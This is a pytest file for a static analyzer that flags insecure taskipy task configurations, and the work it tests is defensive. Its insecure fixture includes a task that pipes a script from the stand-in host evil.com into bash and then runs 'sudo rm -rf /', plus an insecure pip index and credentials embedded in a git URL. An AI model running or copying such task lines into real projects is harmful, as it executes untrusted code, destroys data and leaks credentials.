"""Tests for TaskipyAnalyzer."""

from pathlib import Path

from devai.taskipy_analyzer import TaskipyAnalyzer, TaskipyFinding


INSECURE_PYPROJECT = """\
[project]
name = "example"
version = "0.1.0"

[tool.taskipy]
use_vars = true

[tool.taskipy.tasks]
lint = "ruff check ."
deploy = "curl http://evil.com/install.sh | bash && sudo rm -rf /"
publish = "pip install --index-url http://insecure.pypi.org/simple pkg"
clone = "git clone http://user:pass@github.com/org/repo.git"
api_key = "hardcoded-secret-token-12345"
"""

HARDENED_PYPROJECT = """\
[project]
name = "example"
version = "0.1.0"

[tool.taskipy]
use_vars = false

[tool.taskipy.tasks]
lint = "ruff check ."
test = "pytest tests"
deploy = "deploy-cli --token {DEPLOY_TOKEN}"
"""

INSECURE_TASKIPY_TOML = """\
[tool.taskipy]
use_vars = true
password = supersecret123

[tool.taskipy.tasks]
build = "make && sudo systemctl restart app"
"""


class TestTaskipyAnalyzer:
    def test_detects_insecure_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = TaskipyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "dangerous_command" in kinds
        assert "sudo_usage" in kinds
        assert "use_vars_all" in kinds
        assert "insecure_pip_index" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_pyproject_clean(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = TaskipyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_detects_taskipy_toml(self, tmp_path: Path):
        (tmp_path / "taskipy.toml").write_text(INSECURE_TASKIPY_TOML, encoding="utf-8")
        analyzer = TaskipyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "taskipy.toml" for f in findings)
        assert any(f.kind == "use_vars_all" for f in findings)
        assert any(f.kind == "sudo_usage" for f in findings)

    def test_skips_pyproject_without_taskipy(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "example"\nversion = "0.1.0"\n',
            encoding="utf-8",
        )
        analyzer = TaskipyAnalyzer(str(tmp_path))
        assert analyzer.config_files() == []
        assert analyzer.health_score() == 100.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = TaskipyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "pyproject.toml"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = TaskipyAnalyzer(str(tmp_path))
        assert "Taskipy configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Taskipy analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_template(self):
        snippet = TaskipyAnalyzer(".").generate_hardened_template()
        assert "taskipy" in snippet.lower()
        assert "use_vars = false" in snippet

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = TaskipyAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_finding_dataclass(self):
        finding = TaskipyFinding(
            kind="test",
            severity="low",
            message="test message",
            path="pyproject.toml",
            lineno=1,
        )
        assert "test message" in finding.format()
